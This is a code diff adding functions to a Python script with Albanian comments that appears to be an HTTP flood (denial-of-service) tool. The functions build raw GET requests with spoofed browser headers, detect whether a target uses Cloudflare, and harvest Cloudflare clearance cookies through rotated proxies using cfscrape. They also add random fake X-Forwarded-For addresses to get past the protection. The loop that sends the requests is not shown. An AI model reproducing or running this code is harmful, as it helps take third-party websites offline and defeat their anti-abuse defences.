@@ -50,3 +50,53 @@ def usage():
     return parser.parse_args()
     
 
+ # Funksioni për formimin e HTTP kërkeses nëse Cloudflare == False
+def set_request():
+    global request
+    get_host = "GET /" + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
+    useragent = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\r\n"
+    accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
+    connection = "Connection: Keep-Alive\r\n"
+    request = get_host + useragent + accept + \
+              connection + "\r\n"
+    request_list.append(request)
+
+# Funksioni për formimin e HTTP kërkeses nëse Cloudflare == True
+def set_request_cf():
+    global request_cf
+    global proxy_ip
+    global proxy_port
+    cf_combine = random.choice(cf_token).strip().split("#")
+    proxy_ip = cf_combine[0]
+    proxy_port = cf_combine[1]
+    get_host = "GET /" + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
+    tokens_and_ua = cf_combine[2]
+    accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
+    randomip = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + \
+               "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
+    forward = "X-Forwarded-For: " + randomip + "\r\n"
+    connection = "Connection: Keep-Alive\r\n"
+    request_cf = get_host + tokens_and_ua + accept + forward + connection + "\r\n"
+
+# Funksioni që përcakton se a është website i mbrojtur me Cloudflare
+def cloudflare():
+    cfmessage = False 
+    req = urllib.request.Request(url,headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0'})
+    response = urllib.request.urlopen(req)
+    if "CF-Cache-Status: HIT" in str(response.info()):
+        cfmessage = True
+    return cfmessage
+
+
+# Gjenerimi i cookies dhe useragent për cloudflare kalkulime
+def generate_cf_token(i):
+    proxy= proxy_list[i].strip().split(":") # ['91.93.42.118', '10001'] ruhen ne kete forme
+    try:
+        proxies = {"http": "http://" + proxy[0] + ":" + proxy[1]}
+        scraper = cfscrape.create_scraper()
+        cookie_value, user_agent =scraper.get_cookie_string(url, proxies=proxies)
+        cookie_value_string = "Cookie: " + cookie_value + "\r\n"
+        user_agent_string = "User-Agent: " + user_agent + "\r\n"
+        cf_token.append(proxy[0] + "#" + proxy[1] + "#" + cookie_value_string + user_agent_string)
+    except:
+        pass  
